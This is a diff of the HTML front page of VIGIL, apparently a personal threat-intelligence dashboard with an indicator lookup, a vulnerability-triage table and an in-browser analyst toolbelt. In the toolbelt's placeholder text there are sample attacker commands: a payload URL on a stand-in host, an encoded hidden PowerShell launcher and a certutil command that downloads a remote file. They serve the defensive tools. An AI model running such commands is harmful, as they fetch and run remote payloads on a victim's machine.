@@ -1,59 +1,257 @@
-<!doctype html>
-<html lang="en">
-<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>VIGIL — pipeline status</title>
-<style>
-  body { background:#0F161C; color:#E8E1CF; font-family:system-ui, sans-serif;
-         max-width:900px; margin:2rem auto; padding:0 1rem; }
-  h1 { font-size:1.2rem; letter-spacing:.2em; }
-  h1 b { color:#E2513A; }
-  .note { color:#8799A6; font-size:.85rem; }
-  table { border-collapse:collapse; width:100%; margin:1rem 0; }
-  td, th { border-bottom:1px solid #263644; padding:.4rem .6rem;
-           text-align:left; font-size:.9rem; }
-  .ok { color:#7CC492; } .fail { color:#FF5E49; }
-  li { margin:.35rem 0; font-size:.9rem; }
-  a { color:#6FA8DC; }
-</style>
-</head>
-<body>
-<h1>V<b>I</b>GIL</h1>
-<p class="note">Phase A pipeline status page — replaced by the Chart Room interface in Phase B.</p>
-<div id="app">loading…</div>
-<script>
-(async () => {
-  const app = document.getElementById("app");
-  // Defence in depth: the pipeline sanitizes, the renderer still escapes.
-  const esc = s => String(s ?? "").replace(/[&<>"'`]/g, c => "&#" + c.charCodeAt(0) + ";");
-  const safeUrl = u => { try { const p = new URL(String(u ?? ""));
-    return (p.protocol === "http:" || p.protocol === "https:") ? esc(p.href) : ""; }
-    catch { return ""; } };
-  try {
-    const [health, feed] = await Promise.all([
-      fetch("data/health.json").then(r => r.json()),
-      fetch("data/feed.json").then(r => r.json()),
-    ]);
-    const rows = health.sources.map(s =>
-      `<tr><td>${esc(s.source)}</td>
-           <td class="${s.ok ? "ok" : "fail"}">${s.ok ? "OK" : "FAIL"}</td>
-           <td>${esc(s.items)}</td><td>${esc(s.last_success_at || "—")}</td>
-           <td>${esc((s.error || "").slice(0, 80))}</td></tr>`).join("");
-    const items = feed.items.slice(0, 10).map(i => {
-      const href = safeUrl(i.url);
-      const label = `[${esc(i.severity)}] ${esc(i.title)}`;
-      return `<li>${href ? `<a href="${href}" rel="noopener">${label}</a>` : label}</li>`;
-    }).join("");
-    app.innerHTML = `
-      <p class="note">data generated ${esc(health.generated_at)} —
-         ${esc(feed.items.length)} feed items in window
-         ${health.pipeline_warnings ? " — warnings: " + esc(health.pipeline_warnings.join("; ")) : ""}</p>
-      <table><tr><th>source</th><th>status</th><th>items</th>
-             <th>last success</th><th>error</th></tr>${rows}</table>
-      <h2 style="font-size:1rem">latest items</h2><ul>${items}</ul>`;
-  } catch (e) { app.textContent = "no data yet — pipeline has not run: " + e; }
-})();
-</script>
-</body>
-</html>
+<meta name="description" content="VIGIL — the night watch for open-source threat intelligence. Paste an indicator once: vulnerability verdict, pivots to every public reputation service, and an escalation-ready summary.">
+<meta name="robots" content="noindex">
+<title>VIGIL — Open-Source Threat Intelligence</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Archivo:wdth,wght@62..125,100..900&family=IBM+Plex+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="css/tokens.css">
+<link rel="stylesheet" href="css/base.css">
+<link rel="stylesheet" href="css/chrome.css">
+<link rel="stylesheet" href="css/panels.css">
+
+<header class="topbar">
+  <div class="wrap">
+    <a class="logo" href="#top">
+      <svg viewBox="0 0 26 26" fill="none" aria-hidden="true">
+        <circle cx="13" cy="13" r="11" stroke="#E8E1CF" stroke-width="1.5"/>
+        <path d="M13 4 L21.5 19 L4.5 19 Z" stroke="#E8E1CF" stroke-width="1.5"/>
+        <circle cx="13" cy="13" r="2.2" fill="#E2513A"/>
+      </svg>
+      VIGIL
+    </a>
+    <span class="tlp">TLP:CLEAR</span>
+    <nav>
+      <a href="#brief">Brief</a>
+      <a href="#operations">Operations</a>
+      <a href="#vulns">Vulnerabilities</a>
+      <a href="#health">Health</a>
+      <a href="#registry">Sources</a>
+      <a href="#toolbelt">Toolbelt</a>
+    </nav>
+    <div id="staleChips"></div>
+    <span class="live"><b></b><span id="liveCount">—</span></span>
+  </div>
+</header>
+
+<div class="wrap" id="top">
+  <div class="masthead">
+    <div class="mast-row">
+      <div class="mast-name">VIG<span>I</span>L</div>
+      <div class="mast-ed">
+        EDITION <b id="mastEdition">—</b><br>
+        TRACKED OBJECTS <b id="mastCount">0</b><br>
+        LAST INGEST <b id="mastRefreshed">—</b> · NEXT PULL <b id="mastNext">—</b>
+      </div>
+    </div>
+    <div class="mast-sub">
+      <span class="caps">The night watch for open-source threat intelligence</span>
+      <span id="tagline"></span>
+    </div>
+  </div>
+
+  <div class="hero">
+    <div class="search" id="heroSearch">
+      <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
+      <input id="q" placeholder="Paste any indicator — IP, domain, hash, URL, CVE, or email" spellcheck="false" autocomplete="off" aria-label="Indicator lookup">
+      <span class="detect" id="detect"></span>
+      <kbd>/</kbd>
+    </div>
+    <div class="ex-row" id="exRow"><span class="ex-label">Try</span></div>
+    <div class="hist" id="histRow"></div>
+    <p class="disclose">
+      <b>Disclosure</b>
+      <span>Pivot links send that indicator to the third-party service you click
+      (urlscan publishes public scans). <b class="mono">Use public indicators only.</b>
+      Everything you paste, mark or save stays in this browser — there is no
+      backend, no account and no analytics.
+      <button class="act" id="clearState">Clear analyst state</button></span>
+    </p>
+    <div class="ticker">
+      <span class="lab">Live wire</span>
+      <div class="tick-view"><div class="tick-track" id="tickTrack"></div></div>
+    </div>
+    <div class="band" id="band">
+      <button class="on" data-cat="all">Daily intelligence<b>0</b></button>
+      <button data-cat="ransomware">Ransomware<b>0</b></button>
+      <button data-cat="vulnerability">Vulnerability<b>0</b></button>
+      <button data-cat="apt">APT<b>0</b></button>
+    </div>
+  </div>
+
+  <section id="brief">
+    <div class="ghost">01</div>
+    <div class="sec-head reveal">
+      <div class="sec-title">
+        <div class="sec-kicker purple">Section 01 · AI-generated · local inference</div>
+        <h2>Daily brief</h2>
+      </div>
+      <div class="sec-desc">Written on local hardware from the last 24 hours of
+        collected intelligence. Generated <span class="mono" id="briefGenerated">—</span>.</div>
+      <div class="rule"></div>
+    </div>
+    <div class="brief-list" id="briefList"></div>
+  </section>
+
+  <section id="operations">
+    <div class="ghost">02</div>
+    <div class="sec-head reveal">
+      <div class="sec-title">
+        <div class="sec-kicker">Section 02 · 5 automated collectors</div>
+        <h2>Threat operations</h2>
+      </div>
+      <div class="sec-desc">Daily cyber attack news, campaigns, APT activity,
+        malware and vulnerabilities, each traced to its source.</div>
+      <div class="rule"></div>
+    </div>
+    <div class="ops-tools reveal">
+      <div class="search2">
+        <svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.3-4.3"/></svg>
+        <input id="q2" placeholder="Filter the feed — title, summary, actor, malware, vendor" spellcheck="false" aria-label="Filter feed">
+      </div>
+      <span class="res-chip" id="resChip">—</span>
+      <button class="export" id="exportBtn">Export JSON ↓</button>
+      <button class="export ghostbtn" id="handoffBtn">Handoff ↗</button>
+    </div>
+    <div class="filters reveal" id="filters"></div>
+    <div class="ops-grid">
+      <div class="feed reveal">
+        <div class="feed-h">
+          <span>Daily intelligence · <em class="plain" id="fhCat">all</em></span>
+          <span id="fhCount">—</span>
+        </div>
+        <div id="feedRows"></div>
+      </div>
+      <aside class="rail reveal" id="rail" data-i="1"></aside>
+    </div>
+  </section>
+
+  <section id="vulns">
+    <div class="ghost">03</div>
+    <div class="sec-head reveal">
+      <div class="sec-title">
+        <div class="sec-kicker">Section 03 · KEV × CVSS × EPSS</div>
+        <h2>Vulnerability triage</h2>
+      </div>
+      <div class="sec-desc">Actively exploited and most-likely-exploited first.
+        A KEV chip means CISA has confirmed exploitation in the wild.</div>
+      <div class="rule"></div>
+    </div>
+    <div class="wlbar reveal">
+      <input id="wlInput" placeholder="Add a vendor or product to your watchlist — e.g. fortinet" aria-label="Add to watchlist">
+      <div id="wlChips"></div>
+      <button class="fchip" id="kevOnly">KEV only</button>
+      <button class="fchip" id="wlOnly">Watchlist only</button>
+      <span class="res-chip" id="cveCount">—</span>
+    </div>
+    <table class="vtable reveal">
+      <thead id="cveHead"><tr>
+        <th data-sort="cve">CVE</th><th>Severity</th>
+        <th class="r" data-sort="cvss">CVSS</th><th class="r" data-sort="epss">EPSS</th>
+        <th data-sort="risk">KEV</th><th>Product / vendor</th>
+        <th class="r" data-sort="published">Published</th>
+      </tr></thead>
+      <tbody id="cveRows"></tbody>
+    </table>
+    <button class="showmore" id="showMore" hidden>Show more</button>
+  </section>
+
+  <section id="health">
+    <div class="ghost">04</div>
+    <div class="sec-head reveal">
+      <div class="sec-title">
+        <div class="sec-kicker">Section 04 · Independently degradable</div>
+        <h2>Collection health</h2>
+      </div>
+      <div class="sec-desc">One failing source degrades to a warning — never a
+        broken page. Last-known-good data is retained.</div>
+      <div class="rule"></div>
+    </div>
+    <div id="healthWarn"></div>
+    <div class="hgrid" id="healthGrid"></div>
+  </section>
+
+  <section id="registry">
+    <div class="ghost">05</div>
+    <div class="sec-head reveal">
+      <div class="sec-title">
+        <div class="sec-kicker">Section 05 · <span id="regCollectors">0</span> collectors ·
+          <span id="regReference">0</span> reference</div>
+        <h2>Source registry</h2>
+      </div>
+      <div class="sec-desc">Collector-backed feeds are published here; reference
+        sources are reached by pivot link, never mirrored.</div>
+      <div class="rule"></div>
+    </div>
+    <table class="vtable reveal">
+      <thead><tr><th>Source</th><th>Type</th><th>Operational coverage</th><th class="r">Access</th></tr></thead>
+      <tbody id="regRows"></tbody>
+    </table>
+  </section>
+
+  <section id="toolbelt">
+    <div class="ghost">06</div>
+    <div class="sec-head reveal">
+      <div class="sec-title">
+        <div class="sec-kicker">Section 06 · Runs entirely in your browser</div>
+        <h2>Analyst toolbelt</h2>
+      </div>
+      <div class="sec-desc">Paste artifacts straight from an alert. Nothing you
+        type here leaves the page.</div>
+      <div class="rule"></div>
+    </div>
+    <div class="belt">
+      <div class="tool reveal">
+        <div class="tool-h"><span>Defang / refang</span><button class="act" id="defangBtn">Defang</button></div>
+        <textarea id="defangIn" spellcheck="false" placeholder="http://evil-updates.example/payload.exe   10.14.88.2"></textarea>
+        <div class="out" id="defangOut">—</div>
+      </div>
+      <div class="tool reveal" data-i="1">
+        <div class="tool-h"><span>IOC extract</span>
+          <span><button class="act" id="extractBtn">Extract</button>
+          <button class="act" id="extractLookup">Lookup all ↗</button></span></div>
+        <textarea id="extractIn" spellcheck="false" placeholder="Paste alert text, email headers, or a report paragraph…"></textarea>
+        <div class="out" id="extractOut">—</div>
+      </div>
+      <div class="tool reveal">
+        <div class="tool-h"><span>Base64 decode · UTF-16LE aware</span><button class="act" id="b64Btn">Decode</button></div>
+        <textarea id="b64In" spellcheck="false" placeholder="SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA…"></textarea>
+        <div class="out" id="b64Out">—</div>
+      </div>
+      <div class="tool reveal" data-i="1">
+        <div class="tool-h"><span>PowerShell command parser</span><button class="act" id="psBtn">Parse</button></div>
+        <textarea id="psIn" spellcheck="false" placeholder="powershell.exe -nop -w hidden -enc SQBFAFgA…"></textarea>
+        <div class="out" id="psOut">—</div>
+      </div>
+      <div class="tool reveal">
+        <div class="tool-h"><span>LOLBin lookup</span><button class="act" id="lolbinBtn">Look up</button></div>
+        <textarea id="lolbinIn" spellcheck="false" placeholder="certutil.exe -urlcache -split -f http://x/a"></textarea>
+        <div class="out" id="lolbinOut">—</div>
+      </div>
+    </div>
+  </section>
+
+  <div class="fband">
+    <div>Daily news and research</div>
+    <div>Vulnerability records</div>
+    <div>Actor and malware profiles</div>
+    <div>Analyst utilities</div>
+  </div>
+  <div class="foot">
+    <span>VIGIL — a personal project by SaltyCarl. Not affiliated with or
+      endorsed by any employer; not an official tool of any organization.</span>
+    <span class="mono">KEV (CISA, CC0) · NVD (NIST, public domain) ·
+      EPSS (FIRST) · ATT&amp;CK © THE MITRE CORPORATION · NO WARRANTY —
+      VERIFY BEFORE ACTING</span>
+  </div>
+</div>
+
+<noscript><p class="caps noscript-note">VIGIL requires JavaScript to render collected intelligence.</p></noscript>
+
+<script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/gsap.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrollTrigger.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/ScrambleTextPlugin.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/DrawSVGPlugin.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/gsap@3.13.0/dist/Flip.min.js"></script>
+<script type="module" src="js/app.js"></script>
